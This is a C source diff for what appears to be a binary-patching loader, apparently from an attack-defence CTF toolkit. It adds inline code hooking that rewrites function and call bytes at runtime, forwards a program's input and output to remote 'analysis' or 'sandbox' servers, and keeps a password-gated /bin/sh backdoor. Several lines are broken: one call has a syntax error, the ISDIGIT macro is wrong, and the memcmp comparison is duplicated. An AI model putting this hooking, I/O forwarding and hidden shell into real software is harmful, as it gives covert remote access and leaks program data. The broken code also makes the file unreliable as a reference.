@@ -9,7 +9,7 @@
 #include <sys/wait.h>
 #include "errno.h"
 #include "md5.h"
-
+#include <stdarg.h>
 
 #include <sys/select.h>
 /* According to earlier standards */
@@ -41,25 +41,61 @@
 #define IN_LINE static inline __attribute__((always_inline))
 //#define IN_LINE static
 #define UN_KNOWN_ERROR_CODE 0xFF99FF99
-#define patch_params  ((PATCH_PARAMS*)((long)get_elf_base()+ELF_SIZE+PHDR_PAGE_SIZE))
+
 #define MAX_PATCH_NUM 0x100
+
+enum CODE_SLOT_TYPE{
+    SLOT_GOT= 1,
+    SLOT_FUNCTION,
+    SLOT_CALL
+};
+
 typedef struct PATCH_CODE_SLOT{
-    char code_slot[0x20];
-    char old_code_save[0x20];
-    char* old_code_addr;
+    void* patch_addr;
+    enum CODE_SLOT_TYPE slot_type;
+    int code_slot_len;
+    unsigned char code_slot[0x20];
+    int old_code_save_len;
+    unsigned char old_code_save[0x20];
 }PATCH_CODE_SLOT;
-static char* g_elf_base = 0;
+
 static PATCH_CODE_SLOT* g_patch_code_slot;
 static int g_patch_code_index;
-
+static char* g_elf_base = 0;
+static LOADER_STAGE_THREE g_loader_param;
 
 IN_LINE char* get_elf_base(){
     return g_elf_base;
 }
 
-IN_LINE char* alloc_patch_code_slot(){
+IN_LINE PATCH_CODE_SLOT* search_patch_code_slot(void* key){
+    int i = 0;
     if(g_patch_code_index < MAX_PATCH_NUM && g_patch_code_slot!=NULL){
-        return (char*)g_patch_code_slot+(g_patch_code_index++)*PATCH_SLOT_SIZE;
+        for(i=0;i<g_patch_code_index;i++){
+            if(g_patch_code_slot[i].patch_addr == key)
+                return &g_patch_code_slot[i];
+        }
+        return &g_patch_code_slot[g_patch_code_index++];
+    }
+    return NULL;
+}
+
+IN_LINE PATCH_CODE_SLOT* alloc_patch_code_slot(void* key){
+    int i = 0;
+    if(g_patch_code_index < MAX_PATCH_NUM && g_patch_code_slot!=NULL){
+        for(i=0;i<g_patch_code_index;i++){
+            if(g_patch_code_slot[i].patch_addr == key)
+                return &g_patch_code_slot[i];
+        }
+        return &g_patch_code_slot[g_patch_code_index++];
+    }
+    return NULL;
+}
+
+IN_LINE void dealloc_patch_code_slot(){
+    int i = 0;
+    if(g_patch_code_index < MAX_PATCH_NUM && g_patch_code_slot!=NULL &&  g_patch_code_index>0){
+        g_patch_code_index -- ;
     }
 }
 
@@ -80,11 +116,125 @@ IN_LINE int is_pie(char* elf_base){
 }
 
 
-IN_LINE int  my_strlen(char *src){
+IN_LINE int  my_strlen(const char *src){
     int i = 0;
     while(src[i]!='\0')
         i++;
     return i;
+}
+
+IN_LINE char* my_strchr(char* src,char chr){
+    int i = 0;
+    while(src[i]!='\0' && src[i]!=chr)
+        i++;
+    return &src[i];
+}
+
+IN_LINE char* my_memchr(char* src,char chr,int len){
+    int i = 0;
+    while(src[i]!=chr && i < len)
+        i++;
+    return &src[i];
+}
+
+
+#ifndef ULONG_MAX
+#define	ULONG_MAX	((unsigned long)(~0L))		/* 0xFFFFFFFF */
+#endif
+
+#ifndef LONG_MAX
+#define	LONG_MAX	((long)(ULONG_MAX >> 1))	/* 0x7FFFFFFF */
+#endif
+
+#ifndef LONG_MIN
+#define	LONG_MIN	((long)(~LONG_MAX))		/* 0x80000000 */
+#endif
+
+/*
+ * Convert a string to a long integer.
+ *
+ * Ignores `locale' stuff.  Assumes that the upper and lower case
+ * alphabets and digits are each contiguous.
+ */
+#define ISSPACE(X) ((X==' '))
+#define ISDIGIT(X) ((X>='0' && 'X'<=9))
+#define ISALPHA(X) (((X>='a'&& X<='z') || (X>='A' && X<='Z')))
+#define ISUPPER(X) ((X>='A' && X<='Z'))
+
+IN_LINE long my_strtol(const char *nptr, char **endptr, register int base)
+{
+    register const char *s = nptr;
+    register unsigned long acc;
+    register int c;
+    register unsigned long cutoff;
+    register int neg = 0, any, cutlim;
+
+    /*
+     * Skip white space and pick up leading +/- sign if any.
+     * If base is 0, allow 0x for hex and 0 for octal, else
+     * assume decimal; if base is already 16, allow 0x.
+     */
+    do {
+        c = *s++;
+    } while (ISSPACE(c));
+    if (c == '-') {
+        neg = 1;
+        c = *s++;
+    } else if (c == '+')
+        c = *s++;
+    if ((base == 0 || base == 16) &&
+        c == '0' && (*s == 'x' || *s == 'X')) {
+        c = s[1];
+        s += 2;
+        base = 16;
+    }
+    if (base == 0)
+        base = c == '0' ? 8 : 10;
+
+    /*
+     * Compute the cutoff value between legal numbers and illegal
+     * numbers.  That is the largest legal value, divided by the
+     * base.  An input number that is greater than this value, if
+     * followed by a legal input character, is too big.  One that
+     * is equal to this value may be valid or not; the limit
+     * between valid and invalid numbers is then based on the last
+     * digit.  For instance, if the range for longs is
+     * [-2147483648..2147483647] and the input base is 10,
+     * cutoff will be set to 214748364 and cutlim to either
+     * 7 (neg==0) or 8 (neg==1), meaning that if we have accumulated
+     * a value > 214748364, or equal but the next digit is > 7 (or 8),
+     * the number is too big, and we will return a range error.
+     *
+     * Set any if any `digits' consumed; make it negative to indicate
+     * overflow.
+     */
+    cutoff = neg ? -(unsigned long)LONG_MIN : LONG_MAX;
+    cutlim = cutoff % (unsigned long)base;
+    cutoff /= (unsigned long)base;
+    for (acc = 0, any = 0;; c = *s++) {
+        if (ISDIGIT(c))
+            c -= '0';
+        else if (ISALPHA(c))
+            c -= ISUPPER(c) ? 'A' - 10 : 'a' - 10;
+        else
+            break;
+        if (c >= base)
+            break;
+        if (any < 0 || acc > cutoff || (acc == cutoff && c > cutlim))
+            any = -1;
+        else {
+            any = 1;
+            acc *= base;
+            acc += c;
+        }
+    }
+    if (any < 0) {
+        acc = neg ? LONG_MIN : LONG_MAX;
+    } else if (neg)
+        acc = -acc;
+    if (endptr != 0)
+        *endptr = (char *) (any ? s - 1 : nptr);
+    return (acc);
 }
 
 
@@ -135,27 +285,78 @@ IN_LINE int  my_strcmp(char *dst, char *src){
 }
 
 
-
-IN_LINE int  my_memcmp(char *dst, char *src,int len){
+IN_LINE int  my_strcasecmp(char *dst, char *src){
     int i = 0;
-    while(i<len){
-        if(dst[i] > src[i])
+    char dst_chr;
+    char src_chr;
+    while(dst[i]!='\0'){
+        if(dst[i] <= 'Z' &&dst[i] >= 'A')
+            dst_chr = dst[i] + ('z' - 'Z');
+        else
+            dst_chr = dst[i];
+
+        if(src[i] <= 'Z' &&src[i] >= 'A')
+            src_chr = src[i] + ('z' - 'Z');
+        else
+            src_chr = src[i];
+
+        if(dst_chr > src_chr)
             return 1;
-        else if(dst[i] > src[i])
+        else if(dst_chr < src_chr)
             return -1;
         i++;
     }
     return 0;
 }
-IN_LINE void my_memset(char *dst,char chr,int len){
+
+IN_LINE int  my_strncasecmp(char *dst, char *src,int compare_length){
     int i = 0;
-    for(i=0;i<len;i++)
-        dst[i] = chr;
+    int count = 0 ;
+    char dst_chr;
+    char src_chr;
+    while(dst[i]!='\0' && count <compare_length){
+        if(dst[i] <= 'Z' &&dst[i] >= 'A')
+            dst_chr = dst[i] + ('z' - 'Z');
+        else
+            dst_chr = dst[i];
+
+        if(src[i] <= 'Z' &&src[i] >= 'A')
+            src_chr = src[i] + ('z' - 'Z');
+        else
+            src_chr = src[i];
+
+        if(dst_chr > src_chr)
+            return 1;
+        else if(dst_chr < src_chr)
+            return -1;
+        i++;
+        count ++;
+    }
+    return 0;
 }
-IN_LINE int  my_memcpy(char *dst, char *src,int len){
+
+
+
+IN_LINE int  my_memcmp(void *dst, void *src,int len){
     int i = 0;
     while(i<len){
-        dst[i] = src[i];
+        if( ((char*)dst)[i] > ((char*)src)[i])
+            return 1;
+        else if( ((char*)dst)[i] > ((char*)src)[i])
+            return -1;
+        i++;
+    }
+    return 0;
+}
+IN_LINE void my_memset(void *dst,char chr,int len){
+    int i = 0;
+    for(i=0;i<len;i++)
+        ((char*)dst)[i] = chr;
+}
+IN_LINE int  my_memcpy(void *dst, void *src,int len){
+    int i = 0;
+    while(i<len){
+        ((char*)dst)[i] = ((char*)src)[i];
         i++;
     }
     return 0;
@@ -716,10 +917,10 @@ IN_LINE long my_read(int fd,char* buf,long length){
     return res;
 }
 
-IN_LINE long my_write(int fd,char* buf,long length){
+IN_LINE long my_write(int fd,const char* buf,long length){
     long res = 0;
     if(SYSCALL_DYNAMIC) {
-        long (*write_handler)(int, char *, long) = lookup_symbols("write");
+        long (*write_handler)(int,const char *, long) = lookup_symbols("write");
         if (write_handler != NULL) {
             return write_handler(fd, buf, length);
         }
@@ -858,21 +1059,21 @@ IN_LINE long my_execve(char* elf,char** arg,char** env){
     asm_execve((long)elf,(long)arg,(long)env,res);
     return res;
 }
-}
-IN_LINE long my_mmap(long addr, size_t length, int prot, int flags,
+
+IN_LINE void* my_mmap(void* addr, size_t length, int prot, int flags,
                      int fd, off_t offset){
     long res = 0;
-    asm_mmap(addr,(long)length,(long)prot,(long)flags,(long)fd,(long)offset,res);
-    return res;
+    asm_mmap((long)addr,(long)length,(long)prot,(long)flags,(long)fd,(long)offset,res);
+    return (void*)res;
 }
 
-IN_LINE long my_munmap(long addr,size_t length){
+IN_LINE long my_munmap(void* addr,size_t length){
     long res = 0;
-    asm_munmap(addr,length,res);
+    asm_munmap((long)addr,(long)length,res);
     return res;
 }
 
-IN_LINE long my_mprotect(void *start, size_t len, int prot){
+IN_LINE long my_mprotect(void *start, long len, int prot){
     long res = 0;
     if(SYSCALL_DYNAMIC) {
         long (*mprotect_handler)(void *, size_t, int) = lookup_symbols("mprotect");
@@ -884,8 +1085,8 @@ IN_LINE long my_mprotect(void *start, size_t len, int prot){
     return res;
 }
 
-IN_LINE void my_puts(char* str){
-    void(*my_puts_handler)(char*str) = lookup_symbols("puts");
+IN_LINE void my_puts(const char* str){
+    void(*my_puts_handler)(const char*str) = lookup_symbols("puts");
     if(my_puts_handler!=NULL)
         my_puts_handler(str);
     else{
@@ -893,6 +1094,24 @@ IN_LINE void my_puts(char* str){
         my_write(1,"\n",1);
     }
 }
+
+
+
+static void my_printf(const char *format, ...)
+{
+    void(*vprintf_handler)(const char *,va_list) = lookup_symbols("vprintf");
+    if(vprintf_handler!=NULL) {
+        va_list args;       //定义一个va_list类型的变量，用来储存单个参数
+        va_start(args, format); //使args指向可变参数的第一个参数
+        vprintf_handler(format, args);  //必须用vprintf等带V的
+        va_end(args);       //结束可变参数的获取
+    }
+    else{
+        my_puts(format);
+    }
+}
+
+
 
 IN_LINE long my_write_packet(int fd,char* buf,long size){
     long res = my_write(fd,buf,size);
@@ -926,7 +1145,7 @@ static void start_shell_io_inline(char* buf,int buf_len){
         MD5Init(&md5);
         MD5Update(&md5,buf,sizeof(SHELL_PASSWD)-1);
         MD5Final(&md5,decrypt);
-        if(my_strcmp(decrypt,patch_params->shell_password) == 0){
+        if(my_strcmp(decrypt,g_loader_param.shell_password) == 0){
             my_execve("/bin/sh", (char**)argv, NULL);
         }
     }
@@ -942,7 +1161,7 @@ static void start_shell(char* buf,int buf_len,int child_pid,int save_stdin,int s
         MD5Init(&md5);
         MD5Update(&md5,buf,sizeof(SHELL_PASSWD)-1);
         MD5Final(&md5,decrypt);
-        if(my_strcmp(decrypt,patch_params->shell_password) == 0){
+        if(my_strcmp(decrypt,g_loader_param.shell_password) == 0){
             my_kill(child_pid,9);
             my_close(STDIN_FILENO);
             my_close(STDOUT_FILENO);
@@ -996,18 +1215,43 @@ IN_LINE char* get_heap_base(){
 
 
 IN_LINE void dynamic_hook_function(void* old_function,void* new_function){
-    char* code_slot = alloc_patch_code_slot();
-    if(code_slot == NULL)
+    PATCH_CODE_SLOT* slot = alloc_patch_code_slot(old_function);
+    if(slot == NULL)
         return;
     long res = my_mprotect((void*)DOWN_PADDING((long)old_function,0x1000),0x1000,PROT_READ|PROT_WRITE|PROT_EXEC);
     if(res < 0) {
         return;
     }
+    slot->patch_addr = old_function;
 #ifdef __x86_64__
+    my_memcpy(slot->old_code_save,old_function,14);
+    slot->old_code_save_len = 14;
+    slot->code_slot_len = 14;
+    slot->slot_type = SLOT_FUNCTION;
+
+    slot->code_slot[0] = '\x68';
+    *((unsigned int*)&(((unsigned char*)slot->code_slot) [1]))  = (unsigned int)((long)new_function&0xFFFFFFFF);
+    *((unsigned int*)&(((unsigned char*)slot->code_slot) [5])) = 0x042444c7;
+    *((unsigned int*)&(((unsigned char*)slot->code_slot) [9])) = (long)new_function>>32;
+    ((unsigned char*)slot->code_slot) [13] = '\xc3';
 
 
+    ((unsigned char*)old_function) [0] = '\x68';
+    *((unsigned int*)&(((unsigned char*)old_function) [1]))  = (unsigned int)((long)slot->code_slot&0xFFFFFFFF);
+    *((unsigned int*)&(((unsigned char*)old_function) [5])) = 0x042444c7;
+    *((unsigned int*)&(((unsigned char*)old_function) [9])) = (long)slot->code_slot>>32;
+    ((unsigned char*)old_function) [13] = '\xc3';
 #elif __i386__
+    my_memcpy(slot->old_code_save,old_function,5);
+    slot->old_code_save_len = 5;
+    slot->code_slot_len = 5;
+    slot->slot_type = SLOT_FUNCTION;
 
+     ((unsigned char*)slot->code_slot) [0] = '\xE9';//jmp
+    *((unsigned int*)&(((unsigned char*)slot->code_slot) [1]))   =  (unsigned int)(((unsigned int)new_function-(unsigned int)slot->code_slot - 5)&0xFFFFFFFF);
+
+    ((unsigned char*)old_function) [0] = '\xE9';//jmp
+    *((unsigned int*)&(((unsigned char*)old_function) [1]))   =  (unsigned int)(((unsigned int)slot->code_slot-(unsigned int)old_function - 5)&0xFFFFFFFF);
 #elif __arm__
 
     #elif __aarch64__
@@ -1023,20 +1267,43 @@ IN_LINE void dynamic_hook_function(void* old_function,void* new_function){
 }
 
 IN_LINE void dynamic_hook_call(void* call_addr,void* new_function){
+    PATCH_CODE_SLOT* slot = alloc_patch_code_slot(call_addr);
+    if(slot == NULL)
+        return;
     long res = my_mprotect((void*)DOWN_PADDING((long)call_addr,0x1000),0x1000,PROT_READ|PROT_WRITE|PROT_EXEC);
     if(res < 0) {
-        //my_puts("dynamic_hook_function failed 1");
         return;
     }
+    slot->patch_addr = call_addr;
 #ifdef __x86_64__
-    ((unsigned char*)old_function) [0] = '\x68';
-    *((unsigned int*)&(((unsigned char*)old_function) [1]))  = (unsigned int)((long)new_function&0xFFFFFFFF);
-    *((unsigned int*)&(((unsigned char*)old_function) [5])) = 0x042444c7;
-    *((unsigned int*)&(((unsigned char*)old_function) [9])) = (long)new_function>>32;
-    ((unsigned char*)old_function) [13] = '\xc3';
+    if((long)slot->code_slot - (long)call_addr >= 100000000  || (long)slot->code_slot - (long)call_addr <= -100000000) {
+        dealloc_patch_code_slot();
+#if(PATCH_DEBUG)
+        my_printf("failed to dynamic_hook_call,call_addr =%p, slot->code=%p, new_function=%p\n",call_addr,slot->code_slot,new_function);
+#endif
+    }
+    my_memcpy(slot->old_code_save,call_addr,5);
+    slot->old_code_save_len = 5;
+    slot->code_slot_len = 5;
+    slot->slot_type = SLOT_CALL;
+
+    ((unsigned char*)slot->code_slot) [0] = '\xE8';//jmp
+    *((unsigned int*)&(((unsigned char*)slot->code_slot) [1]))   =  (unsigned int)(((long)new_function-(long)slot->code_slot - 5)&0xFFFFFFFF);
+
+    ((unsigned char*)call_addr) [0] = '\xE8';//jmp
+    *((unsigned int*)&(((unsigned char*)call_addr) [1]))   =  (unsigned int)(((long)slot->code_slot-(long)call_addr - 5)&0xFFFFFFFF);
+
 #elif __i386__
-    ((unsigned char*)old_function) [0] = '\xE8';
-    *((unsigned int*)&(((unsigned char*)call_addr) [1]))   = (unsigned int)(((unsigned int)new_function-(unsigned int)call_addr-5)&0xFFFFFFFF);
+    my_memcpy(slot->old_code_save,call_addr,5);
+    slot->old_code_save_len = 5;
+    slot->code_slot_len = 5;
+    slot->slot_type = SLOT_FUNCTION;
+
+     ((unsigned char*)slot->code_slot) [0] = '\xE8';//jmp
+    *((unsigned int*)&(((unsigned char*)slot->code_slot) [1]))   =  (unsigned int)(((unsigned int)new_function-(unsigned int)slot->code_slot - 5)&0xFFFFFFFF);
+
+    ((unsigned char*)call_addr) [0] = '\xE8';//jmp
+    *((unsigned int*)&(((unsigned char*)call_addr) [1]))   =  (unsigned int)(((unsigned int)slot->code_slot-(unsigned int)call_addr - 5)&0xFFFFFFFF);
 #elif __arm__
 
     #elif __aarch64__
@@ -1050,8 +1317,13 @@ IN_LINE void dynamic_hook_call(void* call_addr,void* new_function){
         return;
     }
 
-
 }
+
+
+IN_LINE void destory_patch_data(){
+    my_munmap((void*)PATCH_DATA_MMAP_FILE_BASE,UP_PADDING(PATCH_DATA_MMAP_FILE_SIZE,0x1000));
+}
+
 
 IN_LINE void start_io_redirect_udp(int send_sockfd,struct sockaddr_in serveraddr,char* libc_start_main_addr,char* stack_on_entry){
     int fd_hook_stdin[2];
@@ -1090,6 +1362,7 @@ IN_LINE void start_io_redirect_udp(int send_sockfd,struct sockaddr_in serveraddr
 
     }
     else{
+        destory_patch_data();
         int flag = my_fcntl(save_stdin,F_GETFL,0);
         my_fcntl(save_stdin,F_SETFL,flag|O_NONBLOCK);
         flag = my_fcntl(fd_hook_stdout[0],F_GETFL,0);
@@ -1208,8 +1481,8 @@ IN_LINE void start_io_redirect_tcp(int send_sockfd, char* libc_start_main_addr,c
 
     }
     else{
+        destory_patch_data();
         my_memcpy(UUID,(void*)&fd_hook_stderr,8);
-
         int flag = my_fcntl(save_stdin,F_GETFL,0);
         my_fcntl(save_stdin,F_SETFL,flag|O_NONBLOCK);
         flag = my_fcntl(fd_hook_stdout[0],F_GETFL,0);
@@ -1292,7 +1565,7 @@ IN_LINE void start_io_redirect_tcp(int send_sockfd, char* libc_start_main_addr,c
     if(child_pid>0)
         my_kill(child_pid,9);
 }
-/*
+
 IN_LINE void start_sandbox_io_redirect_tcp(int send_sockfd) {
     fd_set read_events;
     fd_set err_events;
@@ -1304,61 +1577,8 @@ IN_LINE void start_sandbox_io_redirect_tcp(int send_sockfd) {
     int i = 0;
     unsigned int current_read_index = 0;
     int current_write_index = 0;
-    int flag = my_fcntl(STDIN_FILENO,F_GETFL,0);
-    my_fcntl(STDIN_FILENO,F_SETFL,flag|O_NONBLOCK);
-    flag = my_fcntl(send_sockfd,F_GETFL,0);
-    my_fcntl(send_sockfd,F_SETFL,flag|O_NONBLOCK);
-    while (1) {
-        {
-            length = my_read(STDIN_FILENO, buf, sizeof(buf));
-            if (length > 0) {
-                for(i=0;i<length;i++) {
-                    buf[i] = buf[i]^SANDBOX_XOR_KEY[current_read_index%my_strlen(SANDBOX_XOR_KEY)];
-                    current_read_index ++;
-                }
-                my_write(send_sockfd, buf, length);
-            }
-            else if(length == -1){
-                int error_code = get_errno();
-                if(error_code != UN_KNOWN_ERROR_CODE )
-                    if(error_code != EAGAIN)
-                        break;
-            }
-        }
-        {
-            length = my_read(send_sockfd, buf, sizeof(buf));
-            if (length > 0) {
-                for(i=0;i<length;i++) {
-                    buf[i] = buf[i] ^ SANDBOX_XOR_KEY[current_write_index % my_strlen(SANDBOX_XOR_KEY)];
-                    current_write_index++;
-                }
-                my_write(STDIN_FILENO, buf, length);
-            }
-            else if(length == -1){
-                int error_code = get_errno();
-                if(error_code != UN_KNOWN_ERROR_CODE )
-                    if(error_code != EAGAIN)
-                        break;
-            }
-        }
-        my_sleep(10);
-    }
-    my_exit(0);
-}
-*/
-
-static void start_sandbox_io_redirect_tcp(int send_sockfd) {
-    fd_set read_events;
-    fd_set err_events;
-    struct timeval timeout;
-    timeout.tv_sec = 1;
-    timeout.tv_usec = 0;
-    char buf[131072];
-    unsigned int length = 0;
-    int i = 0;
-    unsigned int current_read_index = 0;
-    int current_write_index = 0;
     int rc = 0;
+    destory_patch_data();
     while (1) {
         FD_ZERO(&read_events);
         FD_SET(STDIN_FILENO, &read_events);
@@ -1468,19 +1688,14 @@ IN_LINE int connect_timeout(int sockfd, const struct sockaddr *addr,
 
 
 IN_LINE int start_sandbox_io_redirect() {
-    if (patch_params->sandbox_host == 0 || patch_params->sandbox_port == 0)
+    if (g_loader_param.sandbox_server.sin_addr.s_addr == 0 || g_loader_param.sandbox_server.sin_port == 0)
         return -1;
-    struct sockaddr_in serveraddr;
-    my_memset((unsigned char *) &(serveraddr), 0, sizeof(serveraddr));
-    serveraddr.sin_family = AF_INET;
-    serveraddr.sin_addr.s_addr = patch_params->sandbox_host;
-    serveraddr.sin_port = patch_params->sandbox_port;
     struct timeval timeout;
     timeout.tv_sec = TCP_TIME_OUT;
     timeout.tv_usec = 0;
     unsigned  int send_sockfd = my_socket(AF_INET, SOCK_STREAM, 0);
     if (send_sockfd >= 0) {
-        int res = connect_timeout(send_sockfd, (struct sockaddr *) &serveraddr, sizeof(struct sockaddr), &timeout);
+        int res = connect_timeout(send_sockfd, (struct sockaddr *) &g_loader_param.sandbox_server, sizeof(struct sockaddr), &timeout);
         if (res == 1) {
             start_sandbox_io_redirect_tcp(send_sockfd);
             my_close(send_sockfd);
@@ -1499,18 +1714,13 @@ IN_LINE void start_common_io_redirect(char* libc_start_main_addr,char* stack_on_
     char path[0x200];
     char file_name[0x100];
     int send_sockfd;
-    if (patch_params->redirect_host != 0 && patch_params->redirect_port != 0) {
-        struct sockaddr_in serveraddr;
-        my_memset((unsigned char *) &(serveraddr), 0, sizeof(serveraddr));
-        serveraddr.sin_family = AF_INET;
-        serveraddr.sin_addr.s_addr = patch_params->redirect_host;
-        serveraddr.sin_port = patch_params->redirect_port;
+    if (g_loader_param.analysis_server.sin_addr.s_addr != 0 && g_loader_param.analysis_server.sin_port != 0) {
         struct timeval timeout;
         timeout.tv_sec = TCP_TIME_OUT;
         timeout.tv_usec = 0;
         send_sockfd = my_socket(AF_INET, SOCK_STREAM, 0);
         if (send_sockfd >= 0) {
-            int res = connect_timeout(send_sockfd, (struct sockaddr *) &serveraddr, sizeof(struct sockaddr), &timeout);
+            int res = connect_timeout(send_sockfd, (struct sockaddr *) &g_loader_param.analysis_server, sizeof(struct sockaddr), &timeout);
             if (res == 1) {
                 start_io_redirect_tcp(send_sockfd, libc_start_main_addr, stack_on_entry);
                 my_close(send_sockfd);
@@ -1534,7 +1744,7 @@ IN_LINE void start_common_io_redirect(char* libc_start_main_addr,char* stack_on_
 
                 send_sockfd = my_socket(AF_INET, SOCK_DGRAM, 0);
                 if (send_sockfd >= 0) {
-                    start_io_redirect_udp(send_sockfd, serveraddr, libc_start_main_addr, stack_on_entry);
+                    start_io_redirect_udp(send_sockfd, g_loader_param.analysis_server, libc_start_main_addr, stack_on_entry);
                     my_close(send_sockfd);
                 }
 #endif
@@ -1556,7 +1766,7 @@ IN_LINE void start_common_io_redirect(char* libc_start_main_addr,char* stack_on_
             }
 #else
             send_sockfd = my_socket(AF_INET, SOCK_DGRAM, 0);
-            start_io_redirect_udp(send_sockfd, serveraddr, libc_start_main_addr, stack_on_entry);
+            start_io_redirect_udp(send_sockfd, g_loader_param.analysis_server, libc_start_main_addr, stack_on_entry);
             my_close(send_sockfd);
 #endif
         }
@@ -1643,18 +1853,13 @@ IN_LINE void start_inline_io_redirect(char* libc_start_main_addr,char* stack_on_
     char file_name[0x100];
     char packet[131082];
     int packet_len;
-    if (patch_params->redirect_host != 0 && patch_params->redirect_port != 0) {
-        struct sockaddr_in serveraddr;
-        my_memset((unsigned char *) &(serveraddr), 0, sizeof(serveraddr));
-        serveraddr.sin_family = AF_INET;
-        serveraddr.sin_addr.s_addr = patch_params->redirect_host;
-        serveraddr.sin_port = patch_params->redirect_port;
+    if (g_loader_param.analysis_server.sin_addr.s_addr != 0 && g_loader_param.analysis_server.sin_port != 0) {
         struct timeval timeout;
         timeout.tv_sec = TCP_TIME_OUT;
         timeout.tv_usec = 0;
         g_redirect_io_fd = my_socket(AF_INET, SOCK_STREAM, 0);
         if (g_redirect_io_fd >= 0) {
-            int res = connect_timeout(g_redirect_io_fd, (struct sockaddr *) &serveraddr, sizeof(struct sockaddr),
+            int res = connect_timeout(g_redirect_io_fd, (struct sockaddr *) &g_loader_param.analysis_server, sizeof(struct sockaddr),
                                       &timeout);
             if (res == 1) {
                 char* heap_base = (char*)get_heap_base();
@@ -1710,7 +1915,7 @@ IN_LINE void start_io_redirect(char* libc_start_main_addr,char* stack_on_entry){
     int res  = start_sandbox_io_redirect();
 #if USE_IO_INLINE_REDIRECT == 1
     if(res == -1)
-        start_inline_io_redirect(libc_start_main_addr,stack_on_entry);
+        start_inline_io_redirect((char* libc_start_main_addr,stack_on_entry);
 #else
     if(res == -1)
         start_common_io_redirect(libc_start_main_addr,stack_on_entry);
@@ -1719,11 +1924,191 @@ IN_LINE void start_io_redirect(char* libc_start_main_addr,char* stack_on_entry){
 }
 
 
+
+
+
+
+IN_LINE Elf_Shdr* get_elf_section_by_index(long index,char* elf_base){
+    Elf_Ehdr* ehdr = (Elf_Ehdr*) elf_base;
+    Elf_Shdr* shdr = (Elf_Shdr*)(elf_base + ehdr->e_shoff + index*ehdr->e_shentsize);
+    return shdr;
+}
+
+Elf_Shdr* get_elf_shstrtab(char* elf_base){
+    Elf_Ehdr* ehdr = (Elf_Ehdr*) elf_base;
+    return get_elf_section_by_index(ehdr->e_shstrndx,elf_base);
+}
+
+IN_LINE Elf_Shdr* get_elf_section_by_name(char* section_name,char* elf_base){
+    Elf_Ehdr* ehdr = (Elf_Ehdr*) elf_base;
+    int i = 0;
+    Elf_Shdr* shstrtab_section = get_elf_shstrtab(elf_base);
+    if(shstrtab_section == NULL)
+        return NULL;
+    char* strtab = (char*)(elf_base + shstrtab_section->sh_offset);
+    for(i=0;i<ehdr->e_shnum;i++){
+        Elf_Shdr* shdr = (Elf_Shdr*)(elf_base + ehdr->e_shoff + i*ehdr->e_shentsize);
+        if(my_strcasecmp((char*)&strtab[shdr->sh_name],section_name)==0)
+            return shdr;
+    }
+    return NULL;
+}
+
+
+IN_LINE void process_got_hook(char* name,Elf_Sym* symbol,char* so_base){
+#if(PATCH_DEBUG==1)
+    my_printf("Process _hook_got_:  %s  Start\n",name);
+#endif
+    long old_plt_vaddr = 0;
+    old_plt_vaddr = my_strtol(name,NULL,16);
+    if(old_plt_vaddr == 0){
+#if (PATCH_DEBUG==1)
+        my_printf("Process _hook_got_:  %s  Failed , unable get vaddr of name\n",name);
+#endif
+        return;
+    }
+    char* new_addr = (char*)g_loader_param.patch_data_mmap_code_base+symbol->st_value;
+    dynamic_hook_function((void*)old_plt_vaddr,(void*)new_addr);
+}
+
+IN_LINE void process_elf_hook(char* symbol_name,Elf_Sym* symbol,char* so_base){
+#if(PATCH_DEBUG==1)
+    my_printf("Process _hook_elf_:  %s  Start\n",symbol_name);
+#endif
+    long need_modify_vaddr = my_strtol(symbol_name,NULL,16);
+    if(need_modify_vaddr == 0){
+#if (PATCH_DEBUG==1)
+        my_printf("Process _hook_elf_:  %s  Failed , unable get vaddr of name\n",symbol_name);
+#endif
+        return;
+    }
+    char* new_addr = (char*)g_loader_param.patch_data_mmap_code_base+symbol->st_value;
+    dynamic_hook_function((void*)need_modify_vaddr,(void*)new_addr);
+
+}
+
+IN_LINE void process_call_hook(char* call_addr,Elf_Sym* symbol,char* so_base){
+#if(PATCH_DEBUG==1)
+    my_printf("Process _hook_call_:  %s  Start\n",call_addr);
+#endif
+    long need_modify_vaddr = my_strtol(call_addr,NULL,16);
+    if(need_modify_vaddr == 0){
+#if (PATCH_DEBUG==1)
+        my_printf("Process _hook_call_:  %s  Failed , unable get vaddr of name\n",call_addr);
+#endif
+        return;
+    }
+    char* new_addr = (char*)g_loader_param.patch_data_mmap_code_base+symbol->st_value;
+    dynamic_hook_call((void*)need_modify_vaddr,(void*)new_addr);
+}
+
+
+IN_LINE void process_hook(Elf_Ehdr* so_base){
+    Elf_Shdr* symtab_section = get_elf_section_by_name(".symtab",(char*)so_base);
+    long sym_offset = symtab_section->sh_offset;
+    long sym_entsize = symtab_section->sh_entsize;
+    long sym_size = symtab_section->sh_size;
+    long sym_num = sym_size/sym_entsize;
+    long sym_link = symtab_section->sh_link;
+    Elf_Shdr* strtab_section = get_elf_section_by_index(sym_link,(char*)so_base);
+    char* strtab = (char*)(so_base + strtab_section->sh_offset);
+    int i = 0;
+    for(i=0;i<sym_num;i++){
+        Elf_Sym* symbol = (Elf_Sym*)(so_base + sym_offset + i*sym_entsize);
+        char* symbol_name = (char*)(&strtab[symbol->st_name]);
+        if(my_strncasecmp(symbol_name,"__hook_got_",my_strlen("__hook_got_"))==0)
+            process_got_hook(&symbol_name[my_strlen("__hook_got_")],symbol,(char*)so_base);
+        else if(my_strncasecmp(symbol_name,"__hook_elf_",my_strlen("__hook_elf_"))==0)
+            process_elf_hook(&symbol_name[my_strlen("__hook_elf_")],symbol,(char*)so_base);
+        else if(my_strncasecmp(symbol_name,"__hook_call_",my_strlen("__hook_call_"))==0)
+            process_call_hook(&symbol_name[my_strlen("__hook_call_")],symbol,(char*)so_base);
+        /*
+        else if(strncasecmp(symbol_name,"__hook_start_",strlen("__hook_start_"))==0)
+            process_start_hook(&symbol_name[strlen("__hook_start_")],symbol,file_desc,so_base);
+            */
+    }
+}
+
+/*
+IN_LINE void dynamic_hook_process_execve(){
+    char execve_str[] ={"execve"};
+    void* hook_handler = (void*)__hook_dynamic_execve;
+    char* execve_handler = lookup_symbols(execve_str);
+    if(execve_handler==NULL)
+        return;
+    dynamic_hook_function(execve_handler,hook_handler);
+}
+
 IN_LINE void dynamic_hook_process_mmap(){
     char mmap_str[] ={"__mmap"};
     char* mmap_handler = lookup_symbols(mmap_str);
     if(mmap_handler==NULL)
         return;
+}
+
+ */
+
+
+IN_LINE void init_hook_env(void* first_instruction){
+    g_elf_base = (char*)DOWN_PADDING((char*)first_instruction-g_loader_param.first_entry_offset,0x1000);
